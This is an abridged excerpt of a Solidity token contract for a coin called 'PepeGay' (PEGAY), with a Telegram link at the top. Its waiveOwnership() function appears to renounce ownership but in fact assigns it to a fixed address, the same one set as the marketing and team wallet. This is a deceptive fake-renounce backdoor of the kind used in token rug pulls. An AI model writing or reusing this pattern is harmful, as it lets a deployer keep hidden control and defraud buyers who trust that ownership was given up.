...
/**
Telegram : https://t.me/Pepegayportal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x6793f431fc6E15A6025100792bA35833Bb9834a2);
    }
...
contract PepeGay is Context, IERC20, Ownable {
    ...
    string private _name = "PepeGay";
    string private _symbol = "PEGAY";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x6793f431fc6E15A6025100792bA35833Bb9834a2);
    address payable private teamWalletAddress = payable(0x6793f431fc6E15A6025100792bA35833Bb9834a2);
